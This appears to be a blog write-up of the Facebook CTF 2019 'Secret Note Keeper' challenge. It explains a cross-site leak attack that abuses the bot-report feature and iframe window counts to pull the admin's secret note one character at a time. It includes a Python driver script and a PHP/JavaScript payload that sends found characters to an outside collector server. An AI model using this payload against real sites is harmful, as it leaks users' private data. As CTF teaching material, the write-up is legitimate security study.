---
comments: true
title: Writeup Secret Note Keeper (xs-leaks) Facebook CTF 2019
date: 2019-07-03 00:00:00 +0700
category:
- ctf
tags:
- fbctf
private: false

---
### Writeup Secret Note Keeper (xs-leaks) Facebook CTF 2019

![](/uploads/fbctf.PNG)

#### English

Were given a website that was able to create note, report note and have a function to search note, the search note function will return each note using an iframe tag, our task is to extract the flag from administrator note.

we found that the report function is sending this json data 

    {"title":"My note","body":"x","link":"you_note_link"}

and we was able to change the link parameter into any resource that we want the admin to visit I try to send my webserver into the link parameter 

    {"title":"My note","body":"x","link":"https://myserver:1337"}

after couple seconds get request from someone that i believe the administrator from secret keeper note website with user agent _Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.169 Safari/537.36._

since the administrator open our url using an **HeadlessChrome** we are able to execute any javascript on behalf as administrator but the thing is how we are able to extract the sensitive information from secret keeper note ? here is come the **xs-leaks power** to extract data from secret keeper note by abusing the search function using side channel attack.

as we know the search function is not implemented **X-Frame-Options** so we are able to frame the url from any origin and the parameter to search a note is using GET parameters so we can specify what query to extract from the GET parameters, search endpoint is look like this [http://challenges.fbctf.com:8082/search?query=](http://challenges.fbctf.com:8082/search?query= "http://challenges.fbctf.com:8082/search?query=")YOUR_QUERY if we use an iframe to secret note keeper from an administrator browser it will use the administrator cookies to open the frame right with an xs-leaks we are able to detect if our search result contains iframe or not using javascript **contentWindow.length** and based on that we are able to build an javascript payload to extract secret from administrator.

I create script to automate the process to extract flag and using hosted requestb.in to grab the response.

    # xs-leaks.py
    import hashlib
    import time
    import itertools
    import string
    import requests
    import os
    import random
    
    def crack(target, size=1):
        for xs in itertools.product("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", repeat=size):
            pw = ''.join(xs)
    	if target == hashlib.md5(pw).hexdigest()[:5]:
                return pw
        return crack(target, size+1)
    
    req = requests.session()
    creds = random.random()
    req.post("http://challenges3.fbctf.com:8082/login",data={"username":str(creds),"password":str(creds)})
    exploit_url ="http://49d351c5.ngrok.io/xs-leaks.php?1={}"
    flag = "fb"
    
    while(1):
    	expl_url = exploit_url.format(flag).replace("&lt;","<")
    	quest = req.get("http://challenges3.fbctf.com:8082/report_bugs").text.split("proof of work for ")[1].split(" (proof of work is first 5")[0]
    	pow = crack(quest)
    	req.post("http://challenges3.fbctf.com:8082/report_bugs",data={"title":flag,"body":"x","link":expl_url,"pow_sol":pow}).text
    	os.system("sleep 5")
    	tmp  = req.get("http://35.247.145.15:8000/wrymemwr?inspect").text.split("query=")[1]
            tmpx = tmp[:len(flag)+1]
    
    	if(tmpx[len(tmpx)-1] != "<"):
                    flag = tmpx
    
    	print "Current Flag: " + flag

#### xs-leaks.py explaination

* login using random credentials
* sovling the captcha using crack function ( this is added by facebook team in the middle of ctf after the bot died multiple times because of everyone send tons of request to the bot )
* report bug into secret note keeper with exploit url (xs-leaks.php)
* sleep 5 ( wait the bot to response )
* lookup the requestb.in if the administrator already respond and extract the data
* print current flag

Another script to make this exploit complete is xs-leaks.php

    <!-- xs-leaks.php -->
    <head><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script></head>
    <body>
      <script>
    	var chars = "_abcdefghijklmnopqrstuvwxyz{}1234567890|<@$^*()!>";
            function measureUrl(url, callback) {
                var iframe = $('<iframe />');
                iframe.attr('src', url);
                iframe.css('display', 'none');
                iframe.on('load', function () {
                    if(callback) callback(url, this.contentWindow.length);
                });
                $('body').append(iframe);
            }
            var flag = '<?=$_GET[1]?>';
            for (var i = 0; i < chars.length; i++) {
                var u = 'http://challenges.fbctf.com:8082/search?query=' + flag+chars.charAt(i);
                measureUrl(u, function(url, res) {
                   if (res!=0) {
                       measureUrl('http://35.247.145.15:8000/wrymemwr?a=' + url);
                   }
                });
            }
      </script>
    </body>
    

#### xs-leaks.php explaination

* loads jquery
* use flag variable from $_GET\[1\]
* bruteforce using chars defined with search query from an iframe ( if contentWindows.lenght != 0 it means the character is found )
* if the javascript detect valid character send it into self hosted requestb.in ( xs-leaks.py will extract the character and append current flag until the last character )

#### Terminal explains more loud

![](/uploads/xs-leaks.PNG)

Automated solve: [https://asciinema.org/a/249560](https://asciinema.org/a/249560 "https://asciinema.org/a/249560")